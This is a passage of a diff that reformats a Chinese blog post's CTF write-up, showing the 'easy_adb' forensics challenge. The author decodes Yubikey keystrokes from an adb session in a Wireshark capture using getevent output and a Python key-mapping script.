@@ -1,80 +1,54 @@
-<!DOCTYPE html>
-<html lang="zh-cn">
-
+<!doctype html><html lang=zh-cn>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>TSCTF 2020 writeup（pwn &#43; misc） | imlk&#39;s blog</title>
-  <link rel="stylesheet" href='/css/style.css' />
-  <link rel="stylesheet" href='/css/fonts.css' />
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap" rel="stylesheet">
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>TSCTF 2020 writeup（pwn + misc） | imlk's blog</title>
+<link rel=stylesheet href=/css/style.css>
+<link rel=stylesheet href=/css/fonts.css>
+<link rel=preconnect href=https://fonts.googleapis.com>
+<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap" rel=stylesheet>
 </head>
-
 <body>
-  <header class="header">
-    <a class="logo" href='/'> imlk's Blog </a>
-    <nav>
-      <ul class="menu">
-        
-        <li><a href="/">Home</a></li>
-        
-        <li><a href="/about/">About</a></li>
-        
-        <li><a href="/archives/">Archives</a></li>
-        
-        <li><a href="/friends/">Friends</a></li>
-        
-        <li><a href="/index.xml">Subscribe</a></li>
-        
-      </ul>
-    </nav>
-  </header>
-  <hr />
-
-
-
-<div class="article-meta">
-    <h1><span class="title">TSCTF 2020 writeup（pwn + misc）</span></h1>
-    
-    <span>
-        <span class="date">2020-10-19</span>
-        |
-        
-        <span class="cats">
-            
-            
-            <a href='https://blog.imlk.top/categories/ctf/'>CTF</a>
-            
-        </span>
-        
-        |
-        <span class="tags">
-            
-            <a href='https://blog.imlk.top/tags/ctf/'>#CTF</a>
-            
-            <a href='https://blog.imlk.top/tags/pwn/'>#pwn</a>
-            
-            <a href='https://blog.imlk.top/tags/android/'>#Android</a>
-            
-        </span>
-        
-    </span>
-    <br>
-    
+<header class=header>
+<a class=logo href=/> imlk's Blog </a>
+<nav>
+<ul class=menu>
+<li><a href=/>Home</a></li>
+<li><a href=/about/>About</a></li>
+<li><a href=/archives/>Archives</a></li>
+<li><a href=/friends/>Friends</a></li>
+<li><a href=/index.xml>Subscribe</a></li>
+</ul>
+</nav>
+</header>
+<hr>
+<div class=article-meta>
+<h1><span class=title>TSCTF 2020 writeup（pwn + misc）</span></h1>
+<span>
+<span class=date>2020-10-19</span>
+|
+<span class=cats>
+<a href=https://blog.imlk.top/categories/ctf/>CTF</a>
+</span>
+|
+<span class=tags>
+<a href=https://blog.imlk.top/tags/ctf/>#CTF</a>
+<a href=https://blog.imlk.top/tags/pwn/>#pwn</a>
+<a href=https://blog.imlk.top/tags/android/>#Android</a>
+</span>
+</span>
+<br>
 </div>
-
-
 <main>
-    <p>部分题目的binary下载：<a href="/objects/tsctf-bin.tar.gz">tsctf-bin.tar.gz</a></p>
-<h2 id="easy_adb">easy_adb</h2>
+<p>部分题目的binary下载：<a href=/objects/tsctf-bin.tar.gz>tsctf-bin.tar.gz</a></p>
+<h2 id=easy_adb>easy_adb</h2>
 <p>这题我们拿到的是一个<code>.pcapng</code>格式的文件，用wireshark可以直接打开，发现是wireshark抓取的一系列的TCP包，分析内容后可以发现这是通过TCP建立的adb shell连接。</p>
-<p>点击<code>Analyze</code>-&gt;<code>Follow TCP Stream</code>就可以看到TCP流信息：</p>
-<p><img src="/images/blog/66/image-20201019120452409.png" alt="image-20201019120452409"></p>
+<p>点击<code>Analyze</code>-><code>Follow TCP Stream</code>就可以看到TCP流信息：</p>
+<p><img src=/images/blog/66/image-20201019120452409.png alt=image-20201019120452409></p>
 <p>我们只关注字符串部分，所有的<code>raw:</code>后面的内容都是shell执行的指令。一开始执行了一些echo语句打印欢迎语。之后出现了<code>getevent -lp</code>、<code>getevent -p</code>、、<code>getevent -l</code>、<code>getevent -t</code>四条和输入事件有关 的指令。</p>
 <p>通过分析得知，插入了一个<code>Yubico Yubikey NEO OTP+U2F+CCID</code>设备，它通过模拟一个键盘向Android输入信息，键和事件ID表如下：</p>
-<pre tabindex="0"><code>add device 1: /dev/input/event4
+<pre tabindex=0><code>add device 1: /dev/input/event4
   name:     &quot;Yubico Yubikey NEO OTP+U2F+CCID&quot;
   events:
     KEY (0001): KEY_ESC               KEY_1                 KEY_2                 KEY_3                
@@ -109,7 +83,7 @@
                 LED_KANA             
   input props:
     &lt;none&gt;
-</code></pre><pre tabindex="0"><code>add device 1: /dev/input/event4
+</code></pre><pre tabindex=0><code>add device 1: /dev/input/event4
   name:     &quot;Yubico Yubikey NEO OTP+U2F+CCID&quot;
   events:
     KEY (0001): 0001  0002  0003  0004  0005  0006  0007  0008 
@@ -131,7 +105,7 @@
   input props:
     &lt;none&gt;
 </code></pre><p>最后<code>getevent -t</code>命令按照时间顺序给出了期间该设备的输入信息，经过简单的处理，我们从中剥离出所有的输出，大概类似于这样：</p>
-<pre tabindex="0"><code>[  269463.944942] 0014 0000 00000000
+<pre tabindex=0><code>[  269463.944942] 0014 0000 00000000
 [  269463.944942] 0014 0001 00000000
 [  269463.944942] 0000 0000 00000000
 [  269463.952956] 0004 0004 00070019
@@ -141,35 +115,35 @@
 [  269463.960909] 0001 002f 00000000
 ...
 </code></pre><p>通过在实机上测试我们发现，第一列是时间，第二列是事件id，第三列是事件的值，第四列是额外的参数，我们从中晒出第二列为<code>0001</code>的行（表示KEY事件），然后筛出第四列为<code>00000001</code>的行（表示按钮抬起的事件），取出第三列的事件id：</p>
-<pre tabindex="0"><code>['002f','002f','0023','0020','0013','0014','0020','0020','0030','0031','002f','002f','0014','0026','0017','0012','0024','0020','0030','0022','0016','0031','0013','0017','002e','0017','0020','0024','0017','0016','002f','0023','0012','0021','0013','0020','0014','0017','0020','0026','0017','0024','0030','0013','001c']
+<pre tabindex=0><code>['002f','002f','0023','0020','0013','0014','0020','0020','0030','0031','002f','002f','0014','0026','0017','0012','0024','0020','0030','0022','0016','0031','0013','0017','002e','0017','0020','0024','0017','0016','002f','0023','0012','0021','0013','0020','0014','0017','0020','0026','0017','0024','0030','0013','001c']
 </code></pre><p>再把上面的两个表做一个映射表出来，写一个python脚本去匹配这些id就能得到输入内容：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ids_str <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;KEY_ESC&#39;</span>,<span style="color:#e6db74">&#39;KEY_1&#39;</span>,<span style="color:#e6db74">&#39;KEY_2&#39;</span>,<span style="color:#e6db74">&#39;KEY_3&#39;</span>,<span style="color:#e6db74">&#39;KEY_4&#39;</span>,<span style="color:#e6db74">&#39;KEY_5&#39;</span>,<span style="color:#e6db74">&#39;KEY_6&#39;</span>,<span style="color:#e6db74">&#39;KEY_7&#39;</span>,<span style="color:#e6db74">&#39;KEY_8&#39;</span>,<span style="color:#e6db74">&#39;KEY_9&#39;</span>,<span style="color:#e6db74">&#39;KEY_0&#39;</span>,<span style="color:#e6db74">&#39;KEY_MINUS&#39;</span>,<span style="color:#e6db74">&#39;KEY_EQUAL&#39;</span>,<span style="color:#e6db74">&#39;KEY_BACKSPACE&#39;</span>,<span style="color:#e6db74">&#39;KEY_TAB&#39;</span>,<span style="color:#e6db74">&#39;KEY_Q&#39;</span>,<span style="color:#e6db74">&#39;KEY_W&#39;</span>,<span style="color:#e6db74">&#39;KEY_E&#39;</span>,<span style="color:#e6db74">&#39;KEY_R&#39;</span>,<span style="color:#e6db74">&#39;KEY_T&#39;</span>,<span style="color:#e6db74">&#39;KEY_Y&#39;</span>,<span style="color:#e6db74">&#39;KEY_U&#39;</span>,<span style="color:#e6db74">&#39;KEY_I&#39;</span>,<span style="color:#e6db74">&#39;KEY_O&#39;</span>,<span style="color:#e6db74">&#39;KEY_P&#39;</span>,<span style="color:#e6db74">&#39;KEY_LEFTBRACE&#39;</span>,<span style="color:#e6db74">&#39;KEY_RIGHTBRACE&#39;</span>,<span style="color:#e6db74">&#39;KEY_ENTER&#39;</span>,<span style="color:#e6db74">&#39;KEY_LEFTCTRL&#39;</span>,<span style="color:#e6db74">&#39;KEY_A&#39;</span>,<span style="color:#e6db74">&#39;KEY_S&#39;</span>,<span style="color:#e6db74">&#39;KEY_D&#39;</span>,<span style="color:#e6db74">&#39;KEY_F&#39;</span>,<span style="color:#e6db74">&#39;KEY_G&#39;</span>,<span style="color:#e6db74">&#39;KEY_H&#39;</span>,<span style="color:#e6db74">&#39;KEY_J&#39;</span>,<span style="color:#e6db74">&#39;KEY_K&#39;</span>,<span style="color:#e6db74">&#39;KEY_L&#39;</span>,<span style="color:#e6db74">&#39;KEY_SEMICOLON&#39;</span>,<span style="color:#e6db74">&#39;KEY_APOSTROPHE&#39;</span>,<span style="color:#e6db74">&#39;KEY_GRAVE&#39;</span>,<span style="color:#e6db74">&#39;KEY_LEFTSHIFT&#39;</span>,<span style="color:#e6db74">&#39;KEY_BACKSLASH&#39;</span>,<span style="color:#e6db74">&#39;KEY_Z&#39;</span>,<span style="color:#e6db74">&#39;KEY_X&#39;</span>,<span style="color:#e6db74">&#39;KEY_C&#39;</span>,<span style="color:#e6db74">&#39;KEY_V&#39;</span>,<span style="color:#e6db74">&#39;KEY_B&#39;</span>,<span style="color:#e6db74">&#39;KEY_N&#39;</span>,<span style="color:#e6db74">&#39;KEY_M&#39;</span>,<span style="color:#e6db74">&#39;KEY_COMMA&#39;</span>,<span style="color:#e6db74">&#39;KEY_DOT&#39;</span>,<span style="color:#e6db74">&#39;KEY_SLASH&#39;</span>,<span style="color:#e6db74">&#39;KEY_RIGHTSHIFT&#39;</span>,<span style="color:#e6db74">&#39;KEY_KPASTERISK&#39;</span>,<span style="color:#e6db74">&#39;KEY_LEFTALT&#39;</span>,<span style="color:#e6db74">&#39;KEY_SPACE&#39;</span>,<span style="color:#e6db74">&#39;KEY_CAPSLOCK&#39;</span>,<span style="color:#e6db74">&#39;KEY_F1&#39;</span>,<span style="color:#e6db74">&#39;KEY_F2&#39;</span>,<span style="color:#e6db74">&#39;KEY_F3&#39;</span>,<span style="color:#e6db74">&#39;KEY_F4&#39;</span>,<span style="color:#e6db74">&#39;KEY_F5&#39;</span>,<span style="color:#e6db74">&#39;KEY_F6&#39;</span>,<span style="color:#e6db74">&#39;KEY_F7&#39;</span>,<span style="color:#e6db74">&#39;KEY_F8&#39;</span>,<span style="color:#e6db74">&#39;KEY_F9&#39;</span>,<span style="color:#e6db74">&#39;KEY_F10&#39;</span>,<span style="color:#e6db74">&#39;KEY_NUMLOCK&#39;</span>,<span style="color:#e6db74">&#39;KEY_SCROLLLOCK&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP7&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP8&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP9&#39;</span>,<span style="color:#e6db74">&#39;KEY_KPMINUS&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP4&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP5&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP6&#39;</span>,<span style="color:#e6db74">&#39;KEY_KPPLUS&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP1&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP2&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP3&#39;</span>,<span style="color:#e6db74">&#39;KEY_KP0&#39;</span>,<span style="color:#e6db74">&#39;KEY_KPDOT&#39;</span>,<span style="color:#e6db74">&#39;KEY_102ND&#39;</span>,<span style="color:#e6db74">&#39;KEY_F11&#39;</span>,<span style="color:#e6db74">&#39;KEY_F12&#39;</span>,<span style="color:#e6db74">&#39;KEY_KPENTER&#39;</span>,<span style="color:#e6db74">&#39;KEY_RIGHTCTRL&#39;</span>,<span style="color:#e6db74">&#39;KEY_KPSLASH&#39;</span>,<span style="color:#e6db74">&#39;KEY_SYSRQ&#39;</span>,<span style="color:#e6db74">&#39;KEY_RIGHTALT&#39;</span>,<span style="color:#e6db74">&#39;KEY_HOME&#39;</span>,<span style="color:#e6db74">&#39;KEY_UP&#39;</span>,<span style="color:#e6db74">&#39;KEY_PAGEUP&#39;</span>,<span style="color:#e6db74">&#39;KEY_LEFT&#39;</span>,<span style="color:#e6db74">&#39;KEY_RIGHT&#39;</span>,<span style="color:#e6db74">&#39;KEY_END&#39;</span>,<span style="color:#e6db74">&#39;KEY_DOWN&#39;</span>,<span style="color:#e6db74">&#39;KEY_PAGEDOWN&#39;</span>,<span style="color:#e6db74">&#39;KEY_INSERT&#39;</span>,<span style="color:#e6db74">&#39;KEY_DELETE&#39;</span>,<span style="color:#e6db74">&#39;KEY_PAUSE&#39;</span>,<span style="color:#e6db74">&#39;KEY_LEFTMETA&#39;</span>,<span style="color:#e6db74">&#39;KEY_RIGHTMETA&#39;</span>,<span style="color:#e6db74">&#39;KEY_COMPOSE&#39;</span>]
-ids <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;0001&#39;</span>,<span style="color:#e6db74">&#39;0002&#39;</span>,<span style="color:#e6db74">&#39;0003&#39;</span>,<span style="color:#e6db74">&#39;0004&#39;</span>,<span style="color:#e6db74">&#39;0005&#39;</span>,<span style="color:#e6db74">&#39;0006&#39;</span>,<span style="color:#e6db74">&#39;0007&#39;</span>,<span style="color:#e6db74">&#39;0008&#39;</span>,<span style="color:#e6db74">&#39;0009&#39;</span>,<span style="color:#e6db74">&#39;000a&#39;</span>,<span style="color:#e6db74">&#39;000b&#39;</span>,<span style="color:#e6db74">&#39;000c&#39;</span>,<span style="color:#e6db74">&#39;000d&#39;</span>,<span style="color:#e6db74">&#39;000e&#39;</span>,<span style="color:#e6db74">&#39;000f&#39;</span>,<span style="color:#e6db74">&#39;0010&#39;</span>,<span style="color:#e6db74">&#39;0011&#39;</span>,<span style="color:#e6db74">&#39;0012&#39;</span>,<span style="color:#e6db74">&#39;0013&#39;</span>,<span style="color:#e6db74">&#39;0014&#39;</span>,<span style="color:#e6db74">&#39;0015&#39;</span>,<span style="color:#e6db74">&#39;0016&#39;</span>,<span style="color:#e6db74">&#39;0017&#39;</span>,<span style="color:#e6db74">&#39;0018&#39;</span>,<span style="color:#e6db74">&#39;0019&#39;</span>,<span style="color:#e6db74">&#39;001a&#39;</span>,<span style="color:#e6db74">&#39;001b&#39;</span>,<span style="color:#e6db74">&#39;001c&#39;</span>,<span style="color:#e6db74">&#39;001d&#39;</span>,<span style="color:#e6db74">&#39;001e&#39;</span>,<span style="color:#e6db74">&#39;001f&#39;</span>,<span style="color:#e6db74">&#39;0020&#39;</span>,<span style="color:#e6db74">&#39;0021&#39;</span>,<span style="color:#e6db74">&#39;0022&#39;</span>,<span style="color:#e6db74">&#39;0023&#39;</span>,<span style="color:#e6db74">&#39;0024&#39;</span>,<span style="color:#e6db74">&#39;0025&#39;</span>,<span style="color:#e6db74">&#39;0026&#39;</span>,<span style="color:#e6db74">&#39;0027&#39;</span>,<span style="color:#e6db74">&#39;0028&#39;</span>,<span style="color:#e6db74">&#39;0029&#39;</span>,<span style="color:#e6db74">&#39;002a&#39;</span>,<span style="color:#e6db74">&#39;002b&#39;</span>,<span style="color:#e6db74">&#39;002c&#39;</span>,<span style="color:#e6db74">&#39;002d&#39;</span>,<span style="color:#e6db74">&#39;002e&#39;</span>,<span style="color:#e6db74">&#39;002f&#39;</span>,<span style="color:#e6db74">&#39;0030&#39;</span>,<span style="color:#e6db74">&#39;0031&#39;</span>,<span style="color:#e6db74">&#39;0032&#39;</span>,<span style="color:#e6db74">&#39;0033&#39;</span>,<span style="color:#e6db74">&#39;0034&#39;</span>,<span style="color:#e6db74">&#39;0035&#39;</span>,<span style="color:#e6db74">&#39;0036&#39;</span>,<span style="color:#e6db74">&#39;0037&#39;</span>,<span style="color:#e6db74">&#39;0038&#39;</span>,<span style="color:#e6db74">&#39;0039&#39;</span>,<span style="color:#e6db74">&#39;003a&#39;</span>,<span style="color:#e6db74">&#39;003b&#39;</span>,<span style="color:#e6db74">&#39;003c&#39;</span>,<span style="color:#e6db74">&#39;003d&#39;</span>,<span style="color:#e6db74">&#39;003e&#39;</span>,<span style="color:#e6db74">&#39;003f&#39;</span>,<span style="color:#e6db74">&#39;0040&#39;</span>,<span style="color:#e6db74">&#39;0041&#39;</span>,<span style="color:#e6db74">&#39;0042&#39;</span>,<span style="color:#e6db74">&#39;0043&#39;</span>,<span style="color:#e6db74">&#39;0044&#39;</span>,<span style="color:#e6db74">&#39;0045&#39;</span>,<span style="color:#e6db74">&#39;0046&#39;</span>,<span style="color:#e6db74">&#39;0047&#39;</span>,<span style="color:#e6db74">&#39;0048&#39;</span>,<span style="color:#e6db74">&#39;0049&#39;</span>,<span style="color:#e6db74">&#39;004a&#39;</span>,<span style="color:#e6db74">&#39;004b&#39;</span>,<span style="color:#e6db74">&#39;004c&#39;</span>,<span style="color:#e6db74">&#39;004d&#39;</span>,<span style="color:#e6db74">&#39;004e&#39;</span>,<span style="color:#e6db74">&#39;004f&#39;</span>,<span style="color:#e6db74">&#39;0050&#39;</span>,<span style="color:#e6db74">&#39;0051&#39;</span>,<span style="color:#e6db74">&#39;0052&#39;</span>,<span style="color:#e6db74">&#39;0053&#39;</span>,<span style="color:#e6db74">&#39;0056&#39;</span>,<span style="color:#e6db74">&#39;0057&#39;</span>,<span style="color:#e6db74">&#39;0058&#39;</span>,<span style="color:#e6db74">&#39;0060&#39;</span>,<span style="color:#e6db74">&#39;0061&#39;</span>,<span style="color:#e6db74">&#39;0062&#39;</span>,<span style="color:#e6db74">&#39;0063&#39;</span>,<span style="color:#e6db74">&#39;0064&#39;</span>,<span style="color:#e6db74">&#39;0066&#39;</span>,<span style="color:#e6db74">&#39;0067&#39;</span>,<span style="color:#e6db74">&#39;0068&#39;</span>,<span style="color:#e6db74">&#39;0069&#39;</span>,<span style="color:#e6db74">&#39;006a&#39;</span>,<span style="color:#e6db74">&#39;006b&#39;</span>,<span style="color:#e6db74">&#39;006c&#39;</span>,<span style="color:#e6db74">&#39;006d&#39;</span>,<span style="color:#e6db74">&#39;006e&#39;</span>,<span style="color:#e6db74">&#39;006f&#39;</span>,<span style="color:#e6db74">&#39;0077&#39;</span>,<span style="color:#e6db74">&#39;007d&#39;</span>,<span style="color:#e6db74">&#39;007e&#39;</span>,<span style="color:#e6db74">&#39;007f&#39;</span>]
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>ids_str <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;KEY_ESC&#39;</span>,<span style=color:#e6db74>&#39;KEY_1&#39;</span>,<span style=color:#e6db74>&#39;KEY_2&#39;</span>,<span style=color:#e6db74>&#39;KEY_3&#39;</span>,<span style=color:#e6db74>&#39;KEY_4&#39;</span>,<span style=color:#e6db74>&#39;KEY_5&#39;</span>,<span style=color:#e6db74>&#39;KEY_6&#39;</span>,<span style=color:#e6db74>&#39;KEY_7&#39;</span>,<span style=color:#e6db74>&#39;KEY_8&#39;</span>,<span style=color:#e6db74>&#39;KEY_9&#39;</span>,<span style=color:#e6db74>&#39;KEY_0&#39;</span>,<span style=color:#e6db74>&#39;KEY_MINUS&#39;</span>,<span style=color:#e6db74>&#39;KEY_EQUAL&#39;</span>,<span style=color:#e6db74>&#39;KEY_BACKSPACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_TAB&#39;</span>,<span style=color:#e6db74>&#39;KEY_Q&#39;</span>,<span style=color:#e6db74>&#39;KEY_W&#39;</span>,<span style=color:#e6db74>&#39;KEY_E&#39;</span>,<span style=color:#e6db74>&#39;KEY_R&#39;</span>,<span style=color:#e6db74>&#39;KEY_T&#39;</span>,<span style=color:#e6db74>&#39;KEY_Y&#39;</span>,<span style=color:#e6db74>&#39;KEY_U&#39;</span>,<span style=color:#e6db74>&#39;KEY_I&#39;</span>,<span style=color:#e6db74>&#39;KEY_O&#39;</span>,<span style=color:#e6db74>&#39;KEY_P&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTBRACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTBRACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_ENTER&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTCTRL&#39;</span>,<span style=color:#e6db74>&#39;KEY_A&#39;</span>,<span style=color:#e6db74>&#39;KEY_S&#39;</span>,<span style=color:#e6db74>&#39;KEY_D&#39;</span>,<span style=color:#e6db74>&#39;KEY_F&#39;</span>,<span style=color:#e6db74>&#39;KEY_G&#39;</span>,<span style=color:#e6db74>&#39;KEY_H&#39;</span>,<span style=color:#e6db74>&#39;KEY_J&#39;</span>,<span style=color:#e6db74>&#39;KEY_K&#39;</span>,<span style=color:#e6db74>&#39;KEY_L&#39;</span>,<span style=color:#e6db74>&#39;KEY_SEMICOLON&#39;</span>,<span style=color:#e6db74>&#39;KEY_APOSTROPHE&#39;</span>,<span style=color:#e6db74>&#39;KEY_GRAVE&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTSHIFT&#39;</span>,<span style=color:#e6db74>&#39;KEY_BACKSLASH&#39;</span>,<span style=color:#e6db74>&#39;KEY_Z&#39;</span>,<span style=color:#e6db74>&#39;KEY_X&#39;</span>,<span style=color:#e6db74>&#39;KEY_C&#39;</span>,<span style=color:#e6db74>&#39;KEY_V&#39;</span>,<span style=color:#e6db74>&#39;KEY_B&#39;</span>,<span style=color:#e6db74>&#39;KEY_N&#39;</span>,<span style=color:#e6db74>&#39;KEY_M&#39;</span>,<span style=color:#e6db74>&#39;KEY_COMMA&#39;</span>,<span style=color:#e6db74>&#39;KEY_DOT&#39;</span>,<span style=color:#e6db74>&#39;KEY_SLASH&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTSHIFT&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPASTERISK&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTALT&#39;</span>,<span style=color:#e6db74>&#39;KEY_SPACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_CAPSLOCK&#39;</span>,<span style=color:#e6db74>&#39;KEY_F1&#39;</span>,<span style=color:#e6db74>&#39;KEY_F2&#39;</span>,<span style=color:#e6db74>&#39;KEY_F3&#39;</span>,<span style=color:#e6db74>&#39;KEY_F4&#39;</span>,<span style=color:#e6db74>&#39;KEY_F5&#39;</span>,<span style=color:#e6db74>&#39;KEY_F6&#39;</span>,<span style=color:#e6db74>&#39;KEY_F7&#39;</span>,<span style=color:#e6db74>&#39;KEY_F8&#39;</span>,<span style=color:#e6db74>&#39;KEY_F9&#39;</span>,<span style=color:#e6db74>&#39;KEY_F10&#39;</span>,<span style=color:#e6db74>&#39;KEY_NUMLOCK&#39;</span>,<span style=color:#e6db74>&#39;KEY_SCROLLLOCK&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP7&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP8&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP9&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPMINUS&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP4&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP5&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP6&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPPLUS&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP1&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP2&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP3&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP0&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPDOT&#39;</span>,<span style=color:#e6db74>&#39;KEY_102ND&#39;</span>,<span style=color:#e6db74>&#39;KEY_F11&#39;</span>,<span style=color:#e6db74>&#39;KEY_F12&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPENTER&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTCTRL&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPSLASH&#39;</span>,<span style=color:#e6db74>&#39;KEY_SYSRQ&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTALT&#39;</span>,<span style=color:#e6db74>&#39;KEY_HOME&#39;</span>,<span style=color:#e6db74>&#39;KEY_UP&#39;</span>,<span style=color:#e6db74>&#39;KEY_PAGEUP&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFT&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHT&#39;</span>,<span style=color:#e6db74>&#39;KEY_END&#39;</span>,<span style=color:#e6db74>&#39;KEY_DOWN&#39;</span>,<span style=color:#e6db74>&#39;KEY_PAGEDOWN&#39;</span>,<span style=color:#e6db74>&#39;KEY_INSERT&#39;</span>,<span style=color:#e6db74>&#39;KEY_DELETE&#39;</span>,<span style=color:#e6db74>&#39;KEY_PAUSE&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTMETA&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTMETA&#39;</span>,<span style=color:#e6db74>&#39;KEY_COMPOSE&#39;</span>]
+ids <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;0001&#39;</span>,<span style=color:#e6db74>&#39;0002&#39;</span>,<span style=color:#e6db74>&#39;0003&#39;</span>,<span style=color:#e6db74>&#39;0004&#39;</span>,<span style=color:#e6db74>&#39;0005&#39;</span>,<span style=color:#e6db74>&#39;0006&#39;</span>,<span style=color:#e6db74>&#39;0007&#39;</span>,<span style=color:#e6db74>&#39;0008&#39;</span>,<span style=color:#e6db74>&#39;0009&#39;</span>,<span style=color:#e6db74>&#39;000a&#39;</span>,<span style=color:#e6db74>&#39;000b&#39;</span>,<span style=color:#e6db74>&#39;000c&#39;</span>,<span style=color:#e6db74>&#39;000d&#39;</span>,<span style=color:#e6db74>&#39;000e&#39;</span>,<span style=color:#e6db74>&#39;000f&#39;</span>,<span style=color:#e6db74>&#39;0010&#39;</span>,<span style=color:#e6db74>&#39;0011&#39;</span>,<span style=color:#e6db74>&#39;0012&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0015&#39;</span>,<span style=color:#e6db74>&#39;0016&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0018&#39;</span>,<span style=color:#e6db74>&#39;0019&#39;</span>,<span style=color:#e6db74>&#39;001a&#39;</span>,<span style=color:#e6db74>&#39;001b&#39;</span>,<span style=color:#e6db74>&#39;001c&#39;</span>,<span style=color:#e6db74>&#39;001d&#39;</span>,<span style=color:#e6db74>&#39;001e&#39;</span>,<span style=color:#e6db74>&#39;001f&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0021&#39;</span>,<span style=color:#e6db74>&#39;0022&#39;</span>,<span style=color:#e6db74>&#39;0023&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0025&#39;</span>,<span style=color:#e6db74>&#39;0026&#39;</span>,<span style=color:#e6db74>&#39;0027&#39;</span>,<span style=color:#e6db74>&#39;0028&#39;</span>,<span style=color:#e6db74>&#39;0029&#39;</span>,<span style=color:#e6db74>&#39;002a&#39;</span>,<span style=color:#e6db74>&#39;002b&#39;</span>,<span style=color:#e6db74>&#39;002c&#39;</span>,<span style=color:#e6db74>&#39;002d&#39;</span>,<span style=color:#e6db74>&#39;002e&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0031&#39;</span>,<span style=color:#e6db74>&#39;0032&#39;</span>,<span style=color:#e6db74>&#39;0033&#39;</span>,<span style=color:#e6db74>&#39;0034&#39;</span>,<span style=color:#e6db74>&#39;0035&#39;</span>,<span style=color:#e6db74>&#39;0036&#39;</span>,<span style=color:#e6db74>&#39;0037&#39;</span>,<span style=color:#e6db74>&#39;0038&#39;</span>,<span style=color:#e6db74>&#39;0039&#39;</span>,<span style=color:#e6db74>&#39;003a&#39;</span>,<span style=color:#e6db74>&#39;003b&#39;</span>,<span style=color:#e6db74>&#39;003c&#39;</span>,<span style=color:#e6db74>&#39;003d&#39;</span>,<span style=color:#e6db74>&#39;003e&#39;</span>,<span style=color:#e6db74>&#39;003f&#39;</span>,<span style=color:#e6db74>&#39;0040&#39;</span>,<span style=color:#e6db74>&#39;0041&#39;</span>,<span style=color:#e6db74>&#39;0042&#39;</span>,<span style=color:#e6db74>&#39;0043&#39;</span>,<span style=color:#e6db74>&#39;0044&#39;</span>,<span style=color:#e6db74>&#39;0045&#39;</span>,<span style=color:#e6db74>&#39;0046&#39;</span>,<span style=color:#e6db74>&#39;0047&#39;</span>,<span style=color:#e6db74>&#39;0048&#39;</span>,<span style=color:#e6db74>&#39;0049&#39;</span>,<span style=color:#e6db74>&#39;004a&#39;</span>,<span style=color:#e6db74>&#39;004b&#39;</span>,<span style=color:#e6db74>&#39;004c&#39;</span>,<span style=color:#e6db74>&#39;004d&#39;</span>,<span style=color:#e6db74>&#39;004e&#39;</span>,<span style=color:#e6db74>&#39;004f&#39;</span>,<span style=color:#e6db74>&#39;0050&#39;</span>,<span style=color:#e6db74>&#39;0051&#39;</span>,<span style=color:#e6db74>&#39;0052&#39;</span>,<span style=color:#e6db74>&#39;0053&#39;</span>,<span style=color:#e6db74>&#39;0056&#39;</span>,<span 